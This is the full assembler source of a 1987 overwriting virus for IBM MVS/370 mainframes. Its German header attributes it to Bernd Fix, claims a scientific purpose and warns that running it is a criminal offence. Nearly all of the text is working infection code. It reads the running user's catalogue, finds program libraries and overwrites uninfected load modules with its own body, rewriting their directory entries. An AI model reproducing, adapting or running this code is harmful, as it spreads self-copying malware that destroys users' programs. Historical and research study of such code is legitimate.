*
*
*
*
*********************************************************************
*                                                                   *
*       #    #  ###  #####   #    #   ####      auf einem Rechner   *
*       #    #   #   #    #  #    #  #                              *
*       #    #   #   #    #  #    #  #          IBM 3090 unter dem  *
*       #    #   #   #####   #    #   ####                          *
*        #  #    #   #  #    #    #       #     Betr.system MVS/370 *
*         ##    ###  #   ##   ####   #####                          *
*                                                                   *
*********************************************************************
*   Version #1,  No Release!!           (p) & (c) foxi, April 1987  *
*-------------------------------------------------------------------*
*                                                                   *
*  W A R N U N G:   Das Assemblieren, Linken und Ausführen des      *
*  ==============   Programms in der Absicht, den Virus in ein      *
*                   Computersystem zu implementieren, ist nach      *
*                   §303a StGB eine  S t r a f t a t !! Dieses      *
*                   Programm dient ausschließlich wissenschaft-     *
*                   lichen Zwecken,  nämlich dem Aufdecken der      *
*                   Gefährdung von Computersystemen durch VIREN.    *
*                   Eine Weitergabe des Programms, das Herstel-     *
*                   len einer lauffähigen Version oder die Mo-      *
*                   difikation des Source-Codes sind ohne eine      *
*                   schriftliche(!) Erlaubnis des Autors nicht      *
*                   statthaft. Bei Zuwiderhandlung behalte ich      *
*                   mir die Möglichkeit vor, Strafanzeige zu        *
*                   erstatten. Die schriftliche Erlaubnis kann      *
*                   unter Angabe der Gründe, warum der Virus        *
*                   weitergegeben, ausgeführt bzw. modifiziert      *
*                   werden soll, beantragt werden bei:              *
*                                                                   *
*                   Bernd Fix, Marienburger Str. 1                  *
*                              6900 Heidelberg-Kirchheim            *
*                              -------------------------            *
*                                                                   *
*********************************************************************
*
*
*
*
*
         START
VIRUS    CSECT
*
*
*        Retten der Register und "Chaining"
*        der Save-Areas
*        ==================================
*
*
         STM   R14,R12,12(R13)
         LR    R12,R15
         USING VIRUS,R12
         LR    R2,R13
         LA    R13,SAVE
         ST    R2,4(R13)
         ST    R13,8(R2)
         B     CONT$0
*
SAVE     DS    18F                          Save-Area
*
BASE     DC    F'0'                         Basisadresse f. Relokation
*
*
**********************************************************************
*                                                                    *
*      S E L B S T R E L O K A T I O N   des Moduls                  *
*                                                                    *
**********************************************************************
*
*
CONT$0   LA    R2,RLDINFO                   Adresse der RLD-Infos
$16      L     R1,0(R2)                     Erste Adresse holen ...
         LA    R1,0(R1)                     ... und auf 3 Byte stutzen
         AR    R1,R12                       Adr. im Modul berechnen.
         CLI   0(R2),X'0D'                  Adr.laenge = 4 Byte?
         BE    $17                          Ja: -->
         BCTR  R1,0                         Ein Byte zurueckgehen.
$17      ICM   R3,15,0(R1)                  4-Byte-Wert holen,
         S     R3,BASE                      alte Basisadresse abziehen
         STCM  R3,15,0(R1)                  und zurueck damit.
         LA    R2,4(R2)                     naechstes Info adressieren
         CLI   0(R2),X'00'                  keines mehr da?
         BNE   $16                          Nein: --> Relozieren...
         ST    R12,BASE                     Jetzige Basis speichern
         MVC   DATEI(96),DSAVE              DCB auf Null-Zustand.
*
*
**********************************************************************
*                                                                    *
*   K A T A L O G     D E S    B E N U T Z E N D E N     L E S E N   *
*                                                                    *
**********************************************************************
*
*        Feststellen der momentanen UserId
*        =================================
*
*
         L     R1,540
         L     R1,12(R1)
         MVC   FSPEC+2(3),0(R1)             Speichern fuer Katalog
*
*
*        Einlesen des Katalogs des Benutzenden
*        fuer den Level  U.UID
*        =====================================
*
*
         L     R0,CATLEN                    Bereitstellen von
         GETMAIN R,LV=(R0)                  Hauptspeicherplatz
         ST    R1,CATADDR                   fuer die Katalogein-
         MVC   0(2,R1),=X'7FFF'             traege (32 KBytes)
*
         LA    R1,PARAM                     Parameter d. Katalogroutine
         LINK  EPLOC=CATROUT                Katalog einlesen lassen
         B     CONT$1
*
*
*        Parameterblock fuer die Katalogprozedur
*        =======================================
*
CATROUT  DC    CL8'IKJEHCIR'
FSPEC    DC    C'U.???',83C' '
*                                           Parameterblock
         DS    0F
PARAM    DC    X'02000000'
         DC    A(FSPEC)                     Adresse von FSPEC
         DC    F'0'
CATADDR  DC    A(0)                         Adresse des Katalog
         DC    F'0'
CATLEN   DC    F'32768'                     Laenge des Katalogs
         LTORG
*
*
**********************************************************************
*                                                                    *
*       S U C H E   E R S T E S    L O A D M O D U L                 *
*                                                                    *
**********************************************************************
*
*
CONT$1   L     R2,CATADDR                   Adr. des Katalogs laden
         LA    R2,4(R2)
*
*
*        Lese Namen des naechsten (ersten) Data Sets
*        ===========================================
*
*
$1       CLI   0(R2),X'FF'                  Keine weiteren Eintraege?
         BE    $5                           Ja: --> Speicher freigeben
*
*
*        Naechste (Erste) Datei dynamisch allokieren
*        ===========================================
*
*
         LA    R1,44                        Laenge des Dateinamens
$2       LA    R3,0(R1,R2)                  bestimmen ...
         CLI   0(R3),C' '
         BNE   $3
         BCT   R1,$2                        ... in R1
*
$3       STH   R1,DSN+4                     Speicher Laenge in TextUnit
         BCTR  R1,0                         Fuer MOVE Laenge um 1 kleiner!
         EX    R1,MOVE                      Uebertragen des Dateinamens
         LA    R1,DSORG
         ST    R1,S99TUPL+8                 Rueckgabe d. Dateiorg.
*
         BAL   R14,ALLOC                    ### Datei allokieren ###
*
*
*        Hat Datei die Struktur fuer LOAD-Module, d.h.
*        DSORG=PO (mit RECFM=U und BLKSIZE=19069) ?
*        =============================================
*
*
*
         CH    R15,=X'0200'                 Ist Datei eine PO-Datei?
         BNE   $4                           Nein: --> naechste Datei
*
*
*        Einlesen des Member-Directories
*        ===============================
*
*
         LA    R0,2560                      Reserviere Speicher
         GETMAIN R,LV=(R0)                  fuer das Directory
         LR    R3,R1
         ST    R1,DIRADDR
*
         BAL   R14,RFILE                    Datei einlesen ...
*
         L     R3,DIRADDR                   Startadr. des Directory
         LA    R3,2(R3)
*
$7       CLI   0(R3),X'FF'                  Letzter Eintrag?
         BE    $8                           Ja: --> Speicher frei
*
$6       CLI   0(R3),X'00'                  Blockende?
         BNE   $12
         LA    R3,1(R3)                     Ja: --> naechstes Byte
         B     $7
*
$12      CLI   11(R3),X'2C'                 moegl. Eintrag eines LOAD-
         BE    $13                          Moduls?   Ja:-->
         XR    R1,R1                        Nein:--> Ueberspringen
         IC    R1,11(R3)                    Anz. der Halbworte holen.
         N     R1,=F'31'                    Nur die letzten 5 Bit.
         SLL   R1,1                         Bytes = 2 x Anz. Halbworte.
         LA    R3,12(R1,R3)                 Adresse naechster Eintrag.
         B     $7
*
$13      LH    R0,20(R3)                    Pruefe Attribut, ob LOAD-
         N     R0,ATTRIB                    Modul und ob das Modul
         BE    $11                          als infiziert gekenn-
         LH    R0,25(R3)                    zeichnet ist.
         CH    R0,=H'0758'
         BNE   INFEKT                       Ja: --> Infiziere Modul!
*
$11      LA    R3,36(R3)                    Nein: --> Naechsten Eintrag
         B     $7
*
$8       L     R1,DIRADDR
         LA    R0,2560
         FREEMAIN R,LV=(R0),A=(R1)          Directory-Speicher frei...
*
*
$4       BAL   R14,FREEALOC                 Alte Alloc freigeben
*
         LA    R2,45(R2)                    Naechste Datei allokieren
         B     $1
*
*
MOVE     MVC   DSN+6(0),1(R2)               Transfer durch EX-Befehl
*
DIRADDR  DC    F'0'                         Adresse des Member-Dir.
*
ATTRIB   DC    X'00000080'                  Attribut eines LOAD-Moduls
*
*
$5       L     R0,CATLEN                    Speicher des Katalogs
         L     R1,CATADDR                   freigeben.
         FREEMAIN R,LV=(R0),A=(R1)
         B     FUNKTION
*
*
*
*
**********************************************************************
*                                                                    *
*       !!! "I N F E K T I O N" !!!  des LOAD-Moduls                 *
*                                    durch Ueberschreiben            *
*                                                                    *
**********************************************************************
*
*
INFEKT   BAL   R14,FREEALOC                 Allok. Member-Dir. aufheben
*
         MVC   MEMBER+6(8),0(R3)            Uebertrage Membernamen
         LA    R1,8                         Laenge des Member-Namens
$10      LA    R5,0(R1,R3)                  bestimmen ...
         BCTR  R5,R0
         CLI   0(R5),C' '
         BNE   $9
         BCT   R1,$10                       ... in R1
$9       STH   R1,MEMBER+4                  und speichern
*
         MVC   ENTRY(8),0(R3)               Namen des Members auch
*                                           fuer UPDATE des Directory
         LA    R0,2560
         L     R1,DIRADDR
         FREEMAIN R,LV=(R0),A=(R1)          Directory-Speicher frei...
*
         L     R0,CATLEN                    Alten Katalogspeicher
         L     R1,CATADDR                   freigeben.
         FREEMAIN R,LV=(R0),A=(R1)
*
         LA    R1,MEMBER
         ST    R1,S99TUPL+8                 Member-Allokierung
*
         BAL   R14,ALLOC                    ### Datei allokieren ###
*
*
*        Ueberschreibe das alte LOAD-
*        Modul mit dem VIRUS-Programm
*        ============================
*
*
         OPEN  (DATEI,OUTPUT)               Datei oeffnen
*
         LA    R2,ESDREC                    Speichere ESD-Record
         BAL   R14,WRITREC
*
         LA    R2,TTR1                      Speichere die drei
         BAL   R14,WRITREC                  obligatorischen TTR-Rec.
*
         LA    R2,TTR2
         BAL   R14,WRITREC
*
         LA    R2,TTR3
         BAL   R14,WRITREC
*
         LA    R2,HEADER                    Header des TXT-Records
         BAL   R14,WRITREC
*
         LA    R1,VIREND                    VIRUS-Programm selbst
         SR    R1,R12                       uebertragen.
         STH   R1,DATEI+82
         ST    R14,RETURN
         LR    R2,R12
         PUT   DATEI,(R2)
         L     R14,RETURN
*
         LA    R2,RLDREC                    Zugehoerigen RLD-Record
         BAL   R14,WRITREC                  uebertragen
*
         CLOSE DATEI                        Datei schliessen.
*
         BAL   R14,FREEALOC                 Allok. aufheben.
*
*
*        Korrigiere den Eintrag im
*        Member-Directory der Datei
*        ==========================
*
*
         LA    R1,0
         ST    R1,S99TUPL+8                 Die PO-Datei
         BAL   R14,ALLOC                    einfach allokieren
*
         OPEN  (DATEI,UPDAT)                Oeffnen zum Schreiben
*
         STOW  DATEI,ENTRY,R                Directory-Eintrag korrig.
         MVC   ENTRY+12(3),ENTRY+8
         IC    R1,ENTRY+14
         LA    R1,5(R1)
         STC   R1,ENTRY+14
         STOW  DATEI,ENTRY,R
*
         CLOSE (DATEI)                      Datei schliessen.
*
         BAL   R14,FREEALOC                 Allokierung aufheben.
*
*
*        Infektion abgeschlossen !
*        =========================
*
*
         B     FUNKTION                     Funktion ausfuehren.
*
*
*        Record-Strukturen fuer die Umwandlung
*        des VIRUS-Codes in ein LOAD-Modul
*        =====================================
*
*
ESDREC   DC    H'40'                        Laenge ESD-Record
         DC    X'20'                        Identifikations-Byte
         DC    X'800000'
         DC    H'1'                         # der 1.ten CSECT
         DC    X'0020'                      Laenge ESD ohne Vorspann
         DC    8X'00'                       1.te CSECT = NULL!
         DC    X'07'                        Kennzeichnung fuer NULL
         DC    7X'00'
         DC    C'VIRUS   '                  2.te CSECT = 'VIRUS   '
         DC    X'00'                        Symbol Definition (SD)
         DC    AL3(0)                       Relativadresse zum Anfang
         DC    X'00'
         DC    X'000758'                    Laenge der CSECT in Bytes
*
*
TTR1     DC    H'251'                       Laenge TTR1-Record
         DC    X'80'                        Identifikationsbyte
         DC    X'FA'                        Laenge ohne ID-Byte
         DC    X'01'                        Art des Eintrags
         DC    248X'00'                     Eintrag ...
*
*
TTR2     DC    H'18'                        Laenge TTR2-Record
         DC    X'80'                        Identifikationsbyte
         DC    X'11'                        Laenge ohne ID-Byte
         DC    X'02'                        Art des Eintrags
         DC    C'566529508 '                Eintrag ...
         DC    X'010087118F'
*
*
TTR3     DC    H'21'                        Laenge TTR3-Record
         DC    X'80'                        Identifikationsbyte
         DC    X'14'                        Laenge ohne ID-Byte
         DC    X'84'                        Art des Eintrags
         DC    X'800200'                    Eintrag ...
         DC    C'566896201 '
         DC    X'020187118F'
*
*
HEADER   DC    H'20'                        Laenge HEADER
         DC    X'01'                        Identifikationsbyte
         DC    X'000001'
         DC    H'4'                         Anzahl Info-Bytes CSECT
         DC    H'0'                         Anzahl Info-Bytes RLD
         DC    X'06'
         DC    AL3(0)                       Adresse TXT-Rec bezgl. Anf.
         DC    C' '                         * immer ein Blank *
         DC    XL3'758'                     Laenge des folg. TXT-Rec
         DC    H'2',X'0758'                 Info-Bytes CSECT
*
*
RLDREC   DC    H'100'                       LAENGE RLD-RECORD
         DC    X'0E'                        Kennbyte RLD-Record
         DC    XL5'00'
         DC    X'0054'                      Laenge RLD ohne Vorspann
         DC    XL8'00'
         DC    H'2',H'2'                    Rel.Ptr & Pos.Ptr
RLDINFO  DC    X'09',XL3'0E1' >---+
         DC    X'0D',XL3'154'     I
         DC    X'09',XL3'2AD'     I
         DC    X'09',XL3'309'     I
         DC    X'09',XL3'325'     I
         DC    X'09',XL3'359'     I      +----------------------------+
         DC    X'09',XL3'58D'     I      I  RELOCATION-INFOS der Form:I
         DC    X'0D',XL3'598'     +----->I                            I
         DC    X'0D',XL3'5A4'     I      I  Status, Adresse (3 Byte)  I
         DC    X'0D',XL3'5A8'     I      +----------------------------+
         DC    X'0D',XL3'5AC'     I
         DC    X'09',XL3'5B1'     I
         DC    X'09',XL3'5B5'     I
         DC    X'0D',XL3'5C0'     I
         DC    X'0D',XL3'5CC'     I
         DC    X'09',XL3'5D1'     I
         DC    X'09',XL3'641'     I
         DC    X'09',XL3'665'     I
         DC    X'09',XL3'6B9'     I
         DC    X'08',XL3'719' >---+
         DC    X'00'
*
*
*        Directory-Eintrag des VIRUS
*        (muss UPDATED werden!)
*        ===========================
*
*
         DS    0H
ENTRY    DC    CL8' '         >-----+  wird vom alten Directory-
         DC    X'000000'      >-----+  Eintrag uebernommen.
         DC    X'2C'
         DC    X'000000'
         DC    X'0000000000'
         DC    X'02E2'                      Attribute des Moduls
         DC    X'000758'                    Laenge des Moduls
         DC    X'0758'
         DC    X'00000088'
         DC    X'0001010000'
*
*
**********************************************************************
*                                                                    *
*         F U N K T I O N    D E S    P R O G R A M M S              *
*                                                                    *
**********************************************************************
*
*
FUNKTION B     ENDE
*
*
*        Beenden des Programms
*        =====================
*
*
ENDE     L     R13,SAVE+4
         LM    R14,R12,12(R13)
         BR    14
*
         LTORG
*
*
*
*
**********************************************************************
*                                                                    *
*   D Y N A M I S C H E S   A L L O K I E R E N   der  Dateien       *
*                                                                    *
**********************************************************************
*
*
ALLOC    LA    R1,S99RBP
         DYNALLOC
         SR    R15,R15
         LH    R15,DSORG+6
         BR    R14
*
*
FREEALOC LA    R1,S99RBP2
         DYNALLOC
         BR    R14
*
*
*        Request Block Pointer  &  Request Block
*        =======================================
*
*
         DS    0F
S99RBP   DC    X'80',AL3(S99RB)             *** Req.Block Pointer ***
*
S99RB    DC    X'1401'                      Laenge(20Bytes),Mod(DSAL),
         DC    X'8800'                      Flag1, Flag2
         DC    F'0'                         Error & Reason Code
S99TXTPP DC    A(S99TUPL)                   Text Unit Pointer List
         DC    F'0'
         DC    X'00000000'                  A-Flag1 bis 4
*
S99TUPL  DC    A(DDN)                       Name der Data Definition
         DC    A(DSN)                       Name des Data Sets
         DC    A(MEMBER) oder A(DSORG)      Member oder Dateiorg.
         DC    X'80',AL3(DISP)              Status der Datei
*
*
S99RBP2  DC    X'80',AL3(S99RB2)
*
S99RB2   DC    X'1402'
         DC    X'0000'
         DC    F'0'
         DC    A(S99TUPL2)
         DC    F'0'
         DC    X'00000000'
*
S99TUPL2 DC    A(DDN)
         DC    X'80',AL3(REMOVE)
*
*
*        Text Units fuer die Allokierung
*        ===============================
*
*
DDN      DC    X'0001'                      *** Data Definition ***
         DC    X'0001'
         DC    X'0008'
         DC    C'SYS99999'
*
DSN      DC    X'0002'                      *** Data Set ***
         DC    X'0001'
         DC    X'000B'
         DC    CL44' '
*
MEMBER   DC    X'0003'                      *** Member des DS ***
         DC    X'0001'
         DC    X'0008'
         DC    CL8'TEMPNAME'
*
DISP     DC    X'0004'                      *** Status des DS ***
         DC    X'0001'
         DC    X'0001'
         DC    X'01'
         DS    0H
*
DSORG    DC    X'0057'                      *** Dateiorganisation ***
         DC    X'0001'
         DC    X'0002'
         DC    X'0000'
*
REMOVE   DC    X'0008'                      *** Remove IN-USE-BIT ***
         DC    X'0000'
*
*
**********************************************************************
*                                                                    *
*        D A T E I       E I N L E S E N    in den Hauptspeicher ... *
*  und   R E C O R D S   S C H R E I B E N  aus d. Hauptspeicher ... *
*                                                                    *
**********************************************************************
*
*
*        Datei lesen
*        ===========
*
*
RFILE    ST    R14,RETURN                   Ruecksprung sichern
         OPEN  DATEI                        Datei zum Lesen oeffnen
R$BLK    GET   DATEI,(R3)                   Block aus der Datei lesen.
         LH    R4,DATEI+82
         LA    R3,0(R4,R3)
         B     R$BLK                        Solange bis Datei-Ende
EOF      CLOSE DATEI                        Schliesse Datei
         L     R14,RETURN
         BR    R14                          Ruecksprung
*
RETURN   DS    1F
*
*
*        Record schreiben
*        ================
*
*
WRITREC  ST    R14,RETURN                   Register sichern.
         LH    R0,0(R2)                     Laenge des Records lesen.
         STH   R0,DATEI+82                  Recordlaenge uebergeben.
         LA    R2,2(R2)                     Anfang des Records
         PUT   DATEI,(R2)                   Record schreiben.
         L     R14,RETURN                   Register holen ...
         BR    R14                          ... und Ruecksprung.
*
*
*        Datei Zugriffs-Block
*        ====================
*
*
DATEI    DCB   DDNAME=SYS99999,MACRF=(GM,PM),BLKSIZE=19069,RECFM=U,    &
               DSORG=PS,EODAD=EOF
*
DSAVE    DCB   DDNAME=SYS99999,MACRF=(GM,PM),BLKSIZE=19069,RECFM=U,    &
               DSORG=PS,EODAD=EOF
*
*
         LTORG
*
VIREND   DS    0C
*
         EQUREG
         END   VIRUS
*
    

